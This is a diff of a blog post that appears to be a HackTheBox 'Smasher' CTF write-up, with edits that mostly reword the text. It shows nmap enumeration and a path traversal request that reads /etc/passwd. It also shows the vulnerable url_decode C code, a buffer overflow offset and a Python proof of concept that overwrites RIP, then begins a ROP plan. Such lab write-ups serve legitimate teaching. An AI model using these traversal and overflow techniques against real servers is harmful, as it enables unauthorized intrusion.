@@ -134,12 +134,12 @@
 
 <h2 id="smasher">Smasher</h2>
 
-<p>Friend of mine suggested me this box as a good &ldquo;inspiration&rdquo; for a task for our upcomming CTF at <a href="http://balccon.org" target="_blank">BalCCon</a> congress.
-I was immediately hooked by the idea of setting a web challenge as entry gate for a binary exploitation challenge where target is web server.<br /> That twist gives it a little bit of &lsquo;real world&rsquo; feeling ( not really), and a better path for libc &lsquo;leaking&rsquo;, unlike ususal &lsquo;here you go, download libc from here&rsquo; way.</p>
+<p>A friend of mine suggested me this box as a good &ldquo;inspiration&rdquo; for a task for our upcomming CTF at <a href="http://balccon.org" target="_blank">BalCCon</a> congress.
+I was immediately hooked by the idea of setting a web challenge as an entry gate for a binary exploitation challenge.<br /> That twist gives it a little bit of &lsquo;real world&rsquo; feeling ( not really), and a better path for libc &lsquo;leaking&rsquo;, unlike ususal &lsquo;here you go, download libc from here&rsquo; way.</p>
 
 <h2 id="vm-enumeration">VM Enumeration</h2>
 
-<p>I&rsquo;ve scanned the VM with nmap, since port 80 had nothing on it, and this is what i found:</p>
+<p>Quick scan with nmap revealed following:</p>
 
 <pre><code>[badarg:~/ctf/hackthebox/box/Smasher]$ nmap -sC -sV 10.10.10.89
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-01 10:28 CEST
@@ -173,7 +173,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 124.22 seconds
 </code></pre>
 
-<p>So there are SSH and HTTP servers running on this box, and HTTP ones name(lmsocialserver?)(Server: shenfeng tiny-web-server) doesn&rsquo;t look familiar.
+<p>There are SSH and HTTP servers running on this box. HTTP server name(lmsocialserver?)(Server: shenfeng tiny-web-server) doesn&rsquo;t look familiar.
 Let&rsquo;s see what it does, and check headers.</p>
 
 <pre><code>[badarg:~/ctf/hackthebox/box/Smasher]$ curl -v http://10.10.10.89:1111/
@@ -196,7 +196,7 @@ Let&rsquo;s see what it does, and check headers.</p>
 &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;%
 </code></pre>
 
-<p>Looks like it returns file listing, with only one file available in that dir, index.html.</p>
+<p>Looks like the web server returns a file listing, which shows that there&rsquo;s only one file available in that dir, and it&rsquo;s index.html.</p>
 
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">&lt;</span>form method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span><span style="color:#f92672">&gt;</span>
 <span style="color:#f92672">&lt;</span>div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;box&#34;</span><span style="color:#f92672">&gt;</span>
@@ -215,9 +215,9 @@ Let&rsquo;s see what it does, and check headers.</p>
 
 <span style="color:#f92672">&lt;</span>script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span><span style="color:#f92672">&gt;&lt;/</span>script<span style="color:#f92672">&gt;</span></code></pre></div>
 
-<p>And this looks like a dead end, because it&rsquo;s a fake login form, with data post method to index.php, which doesn&rsquo;t exist on server. So, got to look somewhere else.</p>
+<p>Looks like a dead end with fake login form. Form action posts data to index.php, which doesn&rsquo;t exist on server. So, we have to look somewhere else.</p>
 
-<p>After some use of gobuster, which gave me interesting insight by hitting points like //..////../etc/, i found this interesting</p>
+<p>Few minutes of checking around with gobuster gave me interesting insight by hitting points like //..////../etc/, i found this interesting</p>
 
 <pre><code>[badarg:~/ctf/hackthebox/box/Smasher]$ curl http://10.10.10.89:1111//etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -251,8 +251,8 @@ www:x:1000:1000:www,,,:/home/www:/bin/bash
 smasher:x:1001:1001:,,,:/home/smasher:/bin/bash
 </code></pre>
 
-<p>So we have path traversal vulnerability in servers code. Nice, but what can we do?
-I&rsquo;ll save you all my failed searches and ideas, in the end i found actual http server code and binary (Yaaay!)</p>
+<p>Looks like we have Path Traversal vulnerability in servers code. Nice, but what can we do with it?
+I&rsquo;ll cut all my failed searches and ideas, in the end i found actual http server code and binary (Yaaay!)</p>
 
 <pre><code>[badarg:~/ctf/hackthebox/box/Smasher]$ curl http://10.10.10.89:1111//home/www/tiny-web-server/ | sed -e 's/&lt;[^&gt;]*&gt;//g'
 .git/2018-03-31 00:57[DIR]
@@ -263,7 +263,7 @@ tiny2018-03-31 00:5744.4K
 Makefile2018-03-31 00:57175
 </code></pre>
 
-<p>Downloaded all of them. Great thing is that we have actual source code, which will speed up the whole process x2. Next i wanted to see, because i knew what my target was, is ASLR on the server on, and what can i do about it?</p>
+<p>Downloaded all of them. Great thing is that we have actual source code, which will speed up the whole process. Next i wanted to see, because i knew what my target was, is ASLR on the server enabled, and what can i do about it?</p>
 
 <p>First, i&rsquo;ve checked version of the system:</p>
 
@@ -296,7 +296,7 @@ libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f846ddf0000)
 <pre><code>GNU C99 5.4.0 20160609 -mtune=generic -march=x86-64 -g -O2 -std=c99 -fno-stack-protector
 </code></pre>
 
-<p>NX is disabled, if you are to belive this one, so i checked.</p>
+<p>NX is disabled, if you are to belive this one -fno-stack-protector, so i checked.</p>
 
 <pre><code>root@--name:/ctf/work# gdb -q tiny
 Reading symbols from tiny...done.
@@ -315,7 +315,7 @@ pwndbg&gt;
 
 <p>Yup, looks like only ASLR is enabled.
 So let&rsquo;s take a step back, and check on tiny.c source code.
-If we take a look at our first vuln on this box, which was directory transversal, you can locate line responsive for it function parse_request()</p>
+If we take a look at our first vuln on this box, which was directory traversal, you can locate line responsive for it in function parse_request()</p>
 
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> filename <span style="color:#f92672">=</span> uri;
 <span style="color:#66d9ef">if</span>(uri[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span>){
@@ -340,7 +340,7 @@ url_decode(filename, req<span style="color:#f92672">-&gt;</span>filename, MAXLIN
     filename <span style="color:#f92672">=</span> uri <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
     <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> strlen(filename);</code></pre></div>
 
-<p>After this filename get&rsquo;s sorted here, it is passed to url_decode(), which is a simple little method:</p>
+<p>After filename gets sorted here, it is passed to url_decode(), which is a simple little method:</p>
 
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">url_decode</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> dest, <span style="color:#66d9ef">int</span> max) {
 	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> src;
@@ -397,7 +397,7 @@ url_decode(filename, req<span style="color:#f92672">-&gt;</span>filename, MAXLIN
 
 <h2 id="exploitation">Exploitation</h2>
 
-<p>Now, that we have most of stuff needed for futher exploitation, let&rsquo;s dive into it.
+<p>Having most of the stuff needed for futher exploitation, let&rsquo;s dive into it.
 Buffer overflow occures when url_decoder() tries to &lsquo;decode&rsquo; filename sent with a GET request. So our payload will be in:</p>
 
 <pre><code>GET /payloadpayloadpayload
@@ -406,16 +406,16 @@ Buffer overflow occures when url_decoder() tries to &lsquo;decode&rsquo; filenam
 <p>Note: we won&rsquo;t count first slash &lsquo;/&rsquo; from GET request in payload length, because it get trimed before processing.
 <img src="/images/smasher/tiny_process.png" alt="" /></p>
 
-<p>from picture above we can calculate that our buffer is at:</p>
+<p>from the picture above we can calculate that our buffer is at:</p>
 
 <pre><code>0x298 - (0x90 - 0x30) = 0x238
 Converted to decimal 568
 </code></pre>
 
 <p>We can test that with and overwrite RIP with B&rsquo;s.
-So our payload is &ldquo;A&rdquo; * 568 + 0x424242424242</p>
+Our payload is &ldquo;A&rdquo; * 568 + 0x424242424242</p>
 
-<p>So, let&rsquo;s run tiny binary in gdb and set breakpoint right after url_decode() ret.</p>
+<p>Let&rsquo;s run tiny binary in gdb and set breakpoint right after url_decode() ret.</p>
 
 <pre><code>root@--name:/ctf/work# gdb -q tiny
 Reading symbols from tiny...done.
@@ -428,7 +428,7 @@ warning: Error disabling address space randomization: Operation not permitted
 listen on port 9999, fd is 3
 </code></pre>
 
-<p>And run this simple POC:</p>
+<p>Run this simple POC:</p>
 
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">	root<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">--</span>name:<span style="color:#f92672">/</span>ctf<span style="color:#f92672">/</span>work<span style="color:#75715e"># cat padding.py </span>
 	<span style="color:#f92672">import</span> requests
@@ -470,7 +470,7 @@ pwndbg&gt; c
 <p>And as expected:
 <img src="/images/smasher/tiny_padding.png" alt="" /></p>
 
-<p>We have overwritten RIP with our 0x424242424242 address.</p>
+<p>We have overwritten RIP with our 0x424242424242 bytes.</p>
 
 <p><b>Plan</b> is:<br />
 1. Find gadget for pop rdi; pop rsi; ret. <br />
